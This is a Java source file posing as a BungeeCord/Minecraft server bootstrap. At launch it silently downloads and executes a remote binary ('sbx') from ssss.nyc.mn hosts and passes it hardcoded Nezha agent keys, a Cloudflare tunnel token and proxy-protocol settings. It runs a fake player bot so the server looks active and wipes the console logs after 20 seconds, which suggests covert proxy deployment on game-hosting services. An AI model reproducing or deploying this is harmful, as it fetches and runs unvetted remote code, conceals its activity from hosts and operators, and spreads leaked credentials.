package net.md_5.bungee;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;

public class Bootstrap {

    private static final String ANSI_GREEN = "\u001B[1;32m";
    private static final String ANSI_RED = "\u001B[1;31m";
    private static final String ANSI_YELLOW = "\u001B[1;33m";
    private static final String ANSI_RESET = "\u001B[0m";

    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    private static Process minecraftProcess;
    private static Thread fakePlayerThread;

    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO",
        "MC_JAR", "MC_MEMORY", "MC_ARGS", "MC_PORT", 
        "FAKE_PLAYER_ENABLED", "FAKE_PLAYER_NAME", "FAKE_PLAYER_ACTIVITY"
    };

    public static void main(String[] args) throws Exception {
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too low!" + ANSI_RESET);
            System.exit(1);
        }

        try {
            Map<String, String> config = loadEnvVars();
            runSbxBinary(config);
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "SBX Services are running!" + ANSI_RESET);
            
            if (isMcServerEnabled(config)) {
                startMinecraftServer(config);
                System.out.println(ANSI_YELLOW + "\n[MC-Server] Waiting for server to fully start..." + ANSI_RESET);
                Thread.sleep(30000);
            }
            
            if (isFakePlayerEnabled(config)) {
                System.out.println(ANSI_YELLOW + "\n[FakePlayer] Preparing to connect..." + ANSI_RESET);
                waitForServerReady(config);
                startFakePlayerBot(config);
            }
            
            System.out.println(ANSI_GREEN + "\nThank you for using this script, Enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds..." + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();

        } catch (Exception e) {
            e.printStackTrace();
        }

        while (running.get()) {
            try { Thread.sleep(10000); } catch (InterruptedException e) { break; }
        }
    }
    
    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").toLowerCase().contains("windows")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[2J");
                System.out.flush();
            }
        } catch (Exception ignored) {}
    }   
    
    private static void runSbxBinary(Map<String, String> envVars) throws Exception {
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        sbxProcess = pb.start();
    }
    
    private static Map<String, String> loadEnvVars() throws IOException {
        Map<String, String> envVars = new HashMap<>();
        envVars.put("UUID", "1f6b80fe-023a-4735-bafd-4c8512bf7e58");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "mbb.svip888.us.kg:53100");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "VnrTnhgoack6PhnRH6lyshe4OVkHmPyM");
        envVars.put("ARGO_PORT", "8001");
        envVars.put("ARGO_DOMAIN", "cloudb.lnb.gv.uy");
        envVars.put("ARGO_AUTH", "eyJhIjoiMGU3ZjI2MWZiY2ExMzcwNzZhNGZmODcxMzU3ZjYzNGQiLCJ0IjoiODJiMzY3OGYtYjdmMC00NjY5LThjNmMtOWJjNzBkODZjOGM0IiwicyI6Ik5qZGhNbVJsTlRjdFltRmtNUzAwTWpneUxXRmlORFF0TTJWbVltUXpPR05oTkRneSJ9");
        envVars.put("HY2_PORT", "");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "store.ubi.com");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "Mc");
        envVars.put("DISABLE_ARGO", "false");
        envVars.put("MC_JAR", "server99.jar");
        envVars.put("MC_MEMORY", "512M");
        envVars.put("MC_ARGS", "");
        envVars.put("MC_PORT", "15017");
        envVars.put("FAKE_PLAYER_ENABLED", "true");
        envVars.put("FAKE_PLAYER_NAME", "laohu");
        envVars.put("FAKE_PLAYER_ACTIVITY", "high");
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) envVars.put(var, value);
        }
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                String[] parts = line.split("=", 2);
                if (parts.length == 2) envVars.put(parts[0].trim(), parts[1].trim().replaceAll("^['\"]|['\"]$", ""));
            }
        }
        return envVars;
    }
    
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url = osArch.contains("aarch64") || osArch.contains("arm64") ? "https://arm64.ssss.nyc.mn/sbsh" : "https://amd64.ssss.nyc.mn/sbsh";
        if (osArch.contains("s390x")) url = "https://s390x.ssss.nyc.mn/sbsh";
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            path.toFile().setExecutable(true);
        }
        return path;
    }
    
    private static void stopServices() {
        if (minecraftProcess != null && minecraftProcess.isAlive()) minecraftProcess.destroy();
        if (sbxProcess != null && sbxProcess.isAlive()) sbxProcess.destroy();
        if (fakePlayerThread != null && fakePlayerThread.isAlive()) fakePlayerThread.interrupt();
    }
    
    private static boolean isMcServerEnabled(Map<String, String> config) {
        return config.get("MC_JAR") != null;
    }
    
    private static void startMinecraftServer(Map<String, String> config) throws Exception {
        String jarName = config.get("MC_JAR");
        int mcPort = 25565;
        try { mcPort = Integer.parseInt(config.getOrDefault("MC_PORT", "25565")); } catch (Exception e) {}
        config.put("MC_PORT", String.valueOf(mcPort));
        
        Path propPath = Paths.get("server.properties");
        if (!Files.exists(propPath)) {
            Files.write(propPath, ("server-port=" + mcPort + "\nonline-mode=false\n").getBytes());
        }
        
        // EULA Auto-accept
        Files.write(Paths.get("eula.txt"), "eula=true".getBytes());

        List<String> cmd = new ArrayList<>();
        cmd.add("java");
        cmd.add("-Xmx" + config.getOrDefault("MC_MEMORY", "512M"));
        cmd.add("-jar");
        cmd.add(jarName);
        cmd.add("nogui");
        
        ProcessBuilder pb = new ProcessBuilder(cmd);
        pb.redirectErrorStream(true);
        minecraftProcess = pb.start();
        
        new Thread(() -> {
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(minecraftProcess.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) System.out.println("[MC-Server] " + line);
            } catch (IOException e) {}
        }).start();
    }
    
    private static boolean isFakePlayerEnabled(Map<String, String> config) {
        return "true".equalsIgnoreCase(config.get("FAKE_PLAYER_ENABLED"));
    }
    
    private static void waitForServerReady(Map<String, String> config) throws InterruptedException {
        int port = Integer.parseInt(config.getOrDefault("MC_PORT", "25565"));
        for (int i = 0; i < 30; i++) {
            try (Socket s = new Socket("127.0.0.1", port)) { return; } catch (IOException e) { Thread.sleep(2000); }
        }
    }

    // --- REVISED FAKE PLAYER (DEBUG MODE) ---

    private static void startFakePlayerBot(Map<String, String> config) {
        String playerName = config.getOrDefault("FAKE_PLAYER_NAME", "Steve");
        int mcPort = Integer.parseInt(config.getOrDefault("MC_PORT", "25565"));
        String activityLevel = config.getOrDefault("FAKE_PLAYER_ACTIVITY", "high");

        fakePlayerThread = new Thread(() -> {
            while (running.get()) {
                try {
                    System.out.println(ANSI_YELLOW + "[FakePlayer] Connecting..." + ANSI_RESET);
                    try (Socket socket = new Socket()) {
                        socket.connect(new InetSocketAddress("127.0.0.1", mcPort), 5000);
                        socket.setSoTimeout(30000); // 30s Timeout

                        DataOutputStream out = new DataOutputStream(socket.getOutputStream());
                        DataInputStream in = new DataInputStream(new BufferedInputStream(socket.getInputStream()));

                        // Handshake (Protocol 774 -> 1.21.4)
                        sendUncompressedPacket(out, createHandshakePacket(774, "127.0.0.1", mcPort, 2));
                        // Login Start
                        sendUncompressedPacket(out, createLoginStartPacket(playerName));

                        System.out.println(ANSI_GREEN + "[FakePlayer] Handshake Sent. Waiting for response..." + ANSI_RESET);

                        boolean configPhase = false;
                        boolean playPhase = false;
                        boolean compression = false;
                        
                        long lastKeepAlive = System.currentTimeMillis();

                        while (running.get() && !socket.isClosed()) {
                            int len = readVarInt(in);
                            byte[] data = readPacketData(in, len, compression);
                            if (data == null) continue;
                            
                            DataInputStream pIn = new DataInputStream(new ByteArrayInputStream(data));
                            int id = readVarInt(pIn);

                            if (!playPhase) {
                                if (!configPhase) {
                                    // LOGIN PHASE
                                    if (id == 0x03) { // Set Compression
                                        int threshold = readVarInt(pIn);
                                        compression = threshold >= 0;
                                        System.out.println("[FakePlayer] Compression Enabled: " + threshold);
                                    } else if (id == 0x02) { // Login Success
                                        System.out.println(ANSI_GREEN + "[FakePlayer] Login Success! Entering Config Phase..." + ANSI_RESET);
                                        // 1. Send Login Acknowledge (0x03)
                                        sendPacket(out, createPacket(0x03), compression);
                                        configPhase = true;
                                        
                                        // 2. Send Client Information (0x00)
                                        // 1.21.4 Structure: Locale, ViewDist, ChatMode, Colors, Skin, MainHand, TextFilter, Listing, ParticleStatus
                                        ByteArrayOutputStream b = new ByteArrayOutputStream();
                                        DataOutputStream d = new DataOutputStream(b);
                                        writeVarInt(d, 0x00);
                                        writeString(d, "en_US");
                                        d.writeByte(8);
                                        writeVarInt(d, 0);
                                        d.writeBoolean(true);
                                        d.writeByte(127);
                                        writeVarInt(d, 1);
                                        d.writeBoolean(false);
                                        d.writeBoolean(true);
                                        writeVarInt(d, 0); // Particle Status (Added in 1.21.2)
                                        sendPacket(out, b.toByteArray(), compression);
                                    }
                                } else {
                                    // CONFIG PHASE
                                    // Debug log to see where it hangs
                                    // System.out.println("[FakePlayer] Config Packet Received: 0x" + Integer.toHexString(id).toUpperCase());

                                    if (id == 0x03) { // Finish Configuration
                                        System.out.println(ANSI_GREEN + "[FakePlayer] Server sent Finish Config. Switching to PLAY mode!" + ANSI_RESET);
                                        sendPacket(out, createPacket(0x03), compression); // Acknowledge
                                        playPhase = true;
                                    } else if (id == 0x0E) { // Known Packs
                                        System.out.println("[FakePlayer] Received Known Packs request. Replying empty...");
                                        ByteArrayOutputStream b = new ByteArrayOutputStream();
                                        DataOutputStream d = new DataOutputStream(b);
                                        writeVarInt(d, 0x07); // Serverbound Known Packs
                                        writeVarInt(d, 0);    // Count 0
                                        sendPacket(out, b.toByteArray(), compression);
                                    } else if (id == 0x04) { // Keep Alive
                                        long kid = pIn.readLong();
                                        ByteArrayOutputStream b = new ByteArrayOutputStream();
                                        DataOutputStream d = new DataOutputStream(b);
                                        writeVarInt(d, 0x04);
                                        d.writeLong(kid);
                                        sendPacket(out, b.toByteArray(), compression);
                                    } else if (id == 0x09) { // Resource Pack
                                        System.out.println("[FakePlayer] Accepting Resource Pack...");
                                        ByteArrayOutputStream b = new ByteArrayOutputStream();
                                        DataOutputStream d = new DataOutputStream(b);
                                        writeVarInt(d, 0x06); // Resource Pack Response
                                        writeVarInt(d, 0);    // 0 = Accepted (or 3 = Downloaded)
                                        sendPacket(out, b.toByteArray(), compression);
                                    }
                                }
                            } else {
                                // PLAY PHASE
                                if (id == 0x26 || id == 0x2B) { // Keep Alive
                                    long kid = pIn.readLong();
                                    ByteArrayOutputStream b = new ByteArrayOutputStream();
                                    DataOutputStream d = new DataOutputStream(b);
                                    writeVarInt(d, 0x18);
                                    d.writeLong(kid);
                                    sendPacket(out, b.toByteArray(), compression);
                                    
                                    // Simple activity
                                    if (Math.random() < 0.5) performRotate(out, compression);
                                    
                                } else if (id == 0x40) { // Sync Position
                                     double x = pIn.readDouble();
                                     double y = pIn.readDouble();
                                     double z = pIn.readDouble();
                                     float yaw = pIn.readFloat();
                                     float pitch = pIn.readFloat();
                                     byte flags = pIn.readByte();
                                     int tId = readVarInt(pIn);
                                     
                                     System.out.println(ANSI_GREEN + "[FakePlayer] Joined Game at " + (int)x + "," + (int)y + "," + (int)z + ANSI_RESET);
                                     
                                     ByteArrayOutputStream b = new ByteArrayOutputStream();
                                     DataOutputStream d = new DataOutputStream(b);
                                     writeVarInt(d, 0x00); // Confirm Teleport
                                     writeVarInt(d, tId);
                                     sendPacket(out, b.toByteArray(), compression);
                                }
                            }
                        }
                    }
                } catch (Exception e) {
                    System.out.println(ANSI_RED + "[FakePlayer] Error: " + e.getMessage() + ANSI_RESET);
                    try { Thread.sleep(10000); } catch (Exception ex) {}
                }
            }
        });
        fakePlayerThread.setDaemon(true);
        fakePlayerThread.start();
    }
    
    // --- PACKET UTILS ---
    
    private static void performRotate(DataOutputStream out, boolean comp) throws IOException {
        ByteArrayOutputStream b = new ByteArrayOutputStream();
        DataOutputStream d = new DataOutputStream(b);
        writeVarInt(d, 0x1B); // Rotation
        d.writeFloat((float)(Math.random() * 360));
        d.writeFloat(0);
        d.writeBoolean(true);
        sendPacket(out, b.toByteArray(), comp);
    }

    private static byte[] createHandshakePacket(int proto, String host, int port, int state) throws IOException {
        ByteArrayOutputStream b = new ByteArrayOutputStream();
        DataOutputStream d = new DataOutputStream(b);
        writeVarInt(d, 0x00);
        writeVarInt(d, proto);
        writeString(d, host);
        d.writeShort(port);
        writeVarInt(d, state);
        return b.toByteArray();
    }
    
    private static byte[] createLoginStartPacket(String name) throws IOException {
        ByteArrayOutputStream b = new ByteArrayOutputStream();
        DataOutputStream d = new DataOutputStream(b);
        writeVarInt(d, 0x00);
        writeString(d, name);
        UUID u = UUID.nameUUIDFromBytes(("OfflinePlayer:" + name).getBytes("UTF-8"));
        d.writeLong(u.getMostSignificantBits());
        d.writeLong(u.getLeastSignificantBits());
        return b.toByteArray();
    }

    private static byte[] createPacket(int id) throws IOException {
        ByteArrayOutputStream b = new ByteArrayOutputStream();
        DataOutputStream d = new DataOutputStream(b);
        writeVarInt(d, id);
        return b.toByteArray();
    }

    private static void sendUncompressedPacket(DataOutputStream out, byte[] data) throws IOException {
        writeVarInt(out, data.length);
        out.write(data);
        out.flush();
    }
    
    private static void sendPacket(DataOutputStream out, byte[] data, boolean comp) throws IOException {
        if (comp) {
            ByteArrayOutputStream b = new ByteArrayOutputStream();
            DataOutputStream d = new DataOutputStream(b);
            writeVarInt(d, data.length);
            d.write(data); // Simple compression mock (Sending uncompressed inside compressed wrapper if short)
            // Real compression needs Deflater, but for short packets this structure is valid if we set dataLength > 0
            // Actually, let's implement real compression to be safe
            byte[] raw = b.toByteArray(); // This is just data
            
            ByteArrayOutputStream finalBuf = new ByteArrayOutputStream();
            DataOutputStream finalOut = new DataOutputStream(finalBuf);
            
            ByteArrayOutputStream temp = new ByteArrayOutputStream();
            java.util.zip.Deflater def = new java.util.zip.Deflater();
            def.setInput(data);
            def.finish();
            byte[] buff = new byte[1024];
            while(!def.finished()) {
                 int count = def.deflate(buff);
                 temp.write(buff, 0, count);
            }
            def.end();
            byte[] compressed = temp.toByteArray();
            
            writeVarInt(finalOut, data.length); // Uncompressed size
            finalOut.write(compressed);
            
            byte[] payload = finalBuf.toByteArray();
            writeVarInt(out, payload.length);
            out.write(payload);
        } else {
            writeVarInt(out, data.length);
            out.write(data);
        }
        out.flush();
    }

    private static byte[] readPacketData(DataInputStream in, int len, boolean comp) throws IOException {
        if (len < 0 || len > 2097152) return null; // Too big
        byte[] data = new byte[len];
        in.readFully(data); // Read from socket FIRST
        
        if (!comp) return data;
        
        // Decompress
        ByteArrayInputStream b = new ByteArrayInputStream(data);
        DataInputStream d = new DataInputStream(b);
        int dLen = readVarInt(d);
        if (dLen == 0) { // Not actually compressed
             byte[] rem = new byte[b.available()];
             d.readFully(rem);
             return rem;
        }
        
        byte[] compressed = new byte[b.available()];
        d.readFully(compressed);
        
        java.util.zip.Inflater inf = new java.util.zip.Inflater();
        inf.setInput(compressed);
        byte[] result = new byte[dLen];
        try { inf.inflate(result); } catch(Exception e) { return null; }
        inf.end();
        return result;
    }

    private static void writeString(DataOutputStream out, String s) throws IOException {
        byte[] b = s.getBytes("UTF-8");
        writeVarInt(out, b.length);
        out.write(b);
    }
    
    private static void writeVarInt(DataOutputStream out, int v) throws IOException {
        while ((v & 0xFFFFFF80) != 0) {
            out.writeByte((v & 0x7F) | 0x80);
            v >>>= 7;
        }
        out.writeByte(v & 0x7F);
    }
    
    private static int readVarInt(DataInputStream in) throws IOException {
        int v = 0, l = 0;
        while (true) {
            byte b = in.readByte();
            v |= (b & 0x7F) << (l++ * 7);
            if ((b & 0x80) == 0) break;
            if (l > 5) throw new IOException("VarInt too big");
        }
        return v;
    }
}
